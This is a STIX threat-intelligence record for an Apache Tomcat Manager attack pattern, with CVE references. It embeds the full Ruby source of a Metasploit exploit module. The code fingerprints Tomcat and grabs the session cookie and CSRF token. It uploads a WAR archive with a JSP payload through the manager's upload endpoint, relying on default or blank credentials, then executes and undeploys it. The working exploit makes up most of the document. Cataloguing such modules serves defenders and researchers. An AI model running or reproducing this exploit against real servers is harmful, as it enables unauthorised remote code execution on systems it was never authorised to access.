{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9db3c185-c9d5-4712-a6a8-86242c84f9f1",
    "created": "2024-08-14T17:09:56.918806Z",
    "modified": "2024-08-14T17:09:56.91881Z",
    "name": "Apache Tomcat Manager Authenticated Upload Code Execution",
    "description": " This module can be used to execute a payload on Apache Tomcat servers that have an exposed \"manager\" application. The payload is uploaded as a WAR archive containing a jsp application using a POST request against the /manager/html/upload component.  NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/tomcat_mgr_upload.rb",
            "external_id": "tomcat_mgr_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3843"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4189"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4188"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0557"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21419179"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4094"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3548"
        },
        {
            "source_name": "reference",
            "url": "http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }\n\n  CSRF_VAR = 'CSRF_NONCE='\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Apache Tomcat Manager Authenticated Upload Code Execution',\n      'Description' => %q{\n        This module can be used to execute a payload on Apache Tomcat servers that\n        have an exposed \"manager\" application. The payload is uploaded as a WAR archive\n        containing a jsp application using a POST request against the /manager/html/upload\n        component.\n\n        NOTE: The compatible payload sets vary based on the selected target. For\n        example, you must select the Windows target to use native Windows payloads.\n      },\n      'Author'      => 'rangercha',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          # This is based on jduck's tomcat_mgr_deploy.\n          # the tomcat_mgr_deploy o longer works for current versions of tomcat due to\n          # CSRF protection tokens. Also PUT requests against the /manager/html/deploy\n          # aren't allowed anymore.\n\n          # There is no single vulnerability associated with deployment functionality.\n          # Instead, the focus has been on insecure/blank/hardcoded default passwords.\n\n          #  The following references refer to HP Operations Manager\n          ['CVE', '2009-3843'],\n          ['OSVDB', '60317'],\n          ['CVE', '2009-4189'],\n          ['OSVDB', '60670'],\n\n          # HP Operations Dashboard\n          ['CVE', '2009-4188'],\n\n          # IBM Cognos Express Default user/pass\n          ['BID', '38084'],\n          ['CVE', '2010-0557'],\n          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179'],\n\n          # IBM Rational Quality Manager and Test Lab Manager\n          ['CVE', '2010-4094'],\n          ['ZDI', '10-214'],\n\n          # 'admin' password is blank in default Windows installer\n          ['CVE', '2009-3548'],\n          ['OSVDB', '60176'],\n          ['BID', '36954'],\n\n          # tomcat docs\n          ['URL', 'http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html']\n        ],\n      'Platform'    => %w{ java linux win }, # others?\n      'Targets'     =>\n        [\n          [ 'Java Universal',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-09'))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [false, 'The username to authenticate as']),\n        OptString.new('HttpPassword', [false, 'The password for the specified username']),\n        # /cognos_express/manager/ for Cognos Express (19300)\n        OptString.new('TARGETURI', [true, \"The URI path of the manager app (/html/upload and /undeploy will be used)\", '/manager'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = query_manager\n    disconnect\n\n    return CheckCode::Unknown if res.nil?\n\n    if res.code.between?(400, 499)\n      vprint_error(\"Server rejected the credentials\")\n      return CheckCode::Unknown\n    end\n\n    return CheckCode::Safe unless res.code == 200\n\n    # if res.code == 200\n    #   there should be access to the Tomcat Manager and to the status page\n    res = query_status\n    return CheckCode::Unknown unless res\n\n    plat = detect_platform(res.body)\n    arch = detect_arch(res.body)\n    return CheckCode::Unknown unless plat and arch\n\n    vprint_status(\"Tomcat Manager found running on #{plat} platform and #{arch} architecture\")\n\n    store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])\n\n    return CheckCode::Appears\n  end\n\n  def exploit\n    @app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    @jsp_name = rand_text_alphanumeric(4 + rand(32 - 4))\n\n    #\n    # Find the session ID and the CSRF token\n    #\n    print_status(\"Retrieving session ID and CSRF token...\")\n    unless access_manager?\n      fail_with(Failure::Unknown, \"Unable to access the Tomcat Manager\")\n    end\n\n    #\n    # Upload Payload\n    #\n    print_status(\"Uploading and deploying #{@app_base}...\")\n    if upload_payload\n      store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])\n    else\n      fail_with(Failure::Unknown, \"Upload failed\")\n    end\n\n    #\n    # Execute Payload\n    #\n    print_status(\"Executing #{@app_base}...\")\n    unless execute_payload\n      fail_with(Failure::Unknown, \"Failed to execute the payload\")\n    end\n\n    #\n    # Get the new CSRF token & session id\n    #\n    unless access_manager?\n      fail_with(Failure::Unknown, \"Unable to access the Tomcat Manager\")\n    end\n\n    #\n    # Delete the deployed payload\n    #\n    print_status(\"Undeploying #{@app_base} ...\")\n    unless undeploy_app\n      print_warning(\"Failed to undeploy #{@app_base}...\")\n    end\n  end\n\n  def query_status\n    path = normalize_uri(target_uri.path.to_s, 'status')\n    res = send_request_raw('uri' => path)\n\n    unless res and res.code == 200\n      vprint_error(\"Failed: Error requesting #{path}\")\n      return nil\n    end\n\n    return res\n  end\n\n  def query_manager\n    path = normalize_uri(target_uri.path.to_s, '/html')\n    res = send_request_raw('uri' => path)\n\n    return res\n  end\n\n  def vars_get\n    vars = {}\n    unless @csrf_token.nil?\n      vars = {\n        \"path\" => @app_base,\n        \"org.apache.catalina.filters.CSRF_NONCE\" => @csrf_token\n      }\n    end\n\n    return vars\n  end\n\n  def vars_undeploy\n    vars = {}\n    unless @csrf_token.nil?\n      vars = {\n        \"path\" => \"/\" + @app_base,\n        \"org.apache.catalina.filters.CSRF_NONCE\" => @csrf_token\n      }\n    end\n\n    return vars\n  end\n\n  def detect_platform(body)\n    return nil if body.blank?\n\n    i=0\n\n    body.each_line do |ln|\n      ln.chomp!\n\n      i = 1 if ln =~ /OS Name/\n\n      if i == 9 or i == 11\n        if ln.include? \"Windows\"\n          return 'win'\n        elsif ln.include? \"Linux\"\n          return 'linux'\n        elsif i==11\n          return 'unknown'\n        end\n      end\n\n      i = i+1 if i > 0\n    end\n  end\n\n  def detect_arch(body)\n    return nil if body.blank?\n\n    i=0\n    body.each_line do |ln|\n      ln.chomp!\n\n      i = 1 if ln =~ /OS Architecture/\n\n      if i==9 or i==11\n        # check against x86_64 before x86 to make sure we don't match\n        # incorrectly on x86 first\n        if ln.include?('x86_64')\n          return ARCH_X64\n        elsif ln.include?('amd64')\n          return ARCH_X64\n        elsif ln.include?('x86')\n          return ARCH_X86\n        elsif ln.include?('i386')\n          return ARCH_X86\n        elsif ln.include?('i686')\n          return ARCH_X86\n        elsif i==11\n          return 'unknown'\n        end\n      end\n\n      i = i + 1 if i > 0\n    end\n  end\n\n  def find_csrf(res = nil)\n    return \"\" if res.blank?\n\n    vprint_status(\"Finding CSRF token...\")\n\n    body = res.body\n\n    body.each_line do |ln|\n      ln.chomp!\n      csrf_nonce = ln.index(CSRF_VAR)\n      next if csrf_nonce.nil?\n      token = ln[csrf_nonce + CSRF_VAR.length, 32]\n      return token\n    end\n\n    return \"\"\n  end\n\n  def war_payload\n    payload.encoded_war({\n      :app_name => @app_base,\n      :jsp_name => @jsp_name,\n      :arch => target.arch,\n      :platform => target.platform\n    }).to_s\n  end\n\n  def send_war_payload(url, war)\n    res = send_request_cgi({\n      'uri'          => url,\n      'method'       => 'POST',\n      'user'         => datastore['HttpUsername'],\n      'password'     => datastore['HttpPassword'],\n      'cookie'       => @session_id,\n      'vars_get'     => vars_get,\n      'vars_form_data' => [\n        {\n          'name' => 'deployWar',\n          'filename' => \"#{@app_base}.war\",\n          'content_type' => 'application/octet-stream',\n          'data' => war,\n          'encoding' => 'binary'\n        }\n      ]\n    })\n\n    res\n  end\n\n  def send_request_undeploy(url)\n    res = send_request_cgi({\n      'uri'          => url,\n      'vars_get'     => vars_undeploy,\n      'method'       => 'POST',\n      'user'         => datastore['HttpUsername'],\n      'password'     => datastore['HttpPassword'],\n      'cookie'       => @session_id\n    })\n\n    return res\n  end\n\n  def access_manager?\n    res = query_manager\n    return false unless res and res.code == 200\n    @session_id = res.get_cookies\n    @csrf_token = find_csrf(res)\n    return true\n  end\n\n  def upload_payload\n    war = war_payload\n    upload_path = normalize_uri(target_uri.path.to_s, \"html\", \"upload\")\n    vprint_status(\"Uploading #{war.length} bytes as #{@app_base}.war ...\")\n    res = send_war_payload(upload_path, war)\n\n    unless res\n      vprint_error(\"Upload failed on #{upload_path} [No Response]\")\n      return false\n    end\n\n    if res.code < 200 or res.code >= 300\n      vprint_warning(\"Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}\") if res.code == 401\n      vprint_error(\"Upload failed on #{upload_path} [#{res.code} #{res.message}]\")\n      return false\n    end\n\n    return true\n  end\n\n  def execute_payload\n    jsp_path = normalize_uri(@app_base, \"#{@jsp_name}.jsp\")\n\n    vprint_status(\"Executing #{jsp_path}...\")\n\n    res = send_request_cgi({\n      'uri'          => jsp_path,\n      'method'       => 'GET'\n    })\n\n    return parse_execute_response(res)\n  end\n\n  def parse_execute_response(res)\n    unless res\n      vprint_error(\"Execution failed on #{@app_base} [No Response]\")\n      return false\n    end\n\n    if res and (res.code < 200 or res.code >= 300)\n      vprint_error(\"Execution failed on #{@app_base} [#{res.code} #{res.message}]\")\n      return false\n    end\n\n    return true\n  end\n\n  def undeploy_app\n    undeploy_url = normalize_uri(target_uri.path.to_s, \"html\", \"undeploy\")\n    res = send_request_undeploy(undeploy_url)\n\n    unless res\n      vprint_warning(\"WARNING: Undeployment failed on #{undeploy_url} [No Response]\")\n      return false\n    end\n\n    if res and (res.code < 200 or res.code >= 300 or res.body =~ /FAIL - Invalid context path/)\n      vprint_warning(\"Deletion failed on #{undeploy_url} [#{res.code} #{res.message}]\")\n      return false\n    end\n\n    print_status(\"Undeployed at #{undeploy_url}\")\n    return true\n  end\n\n  def service_details\n    super.merge({ access_level: 'Admin' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-09",
    "x_mitre_platforms": [
        "linux"
    ]
}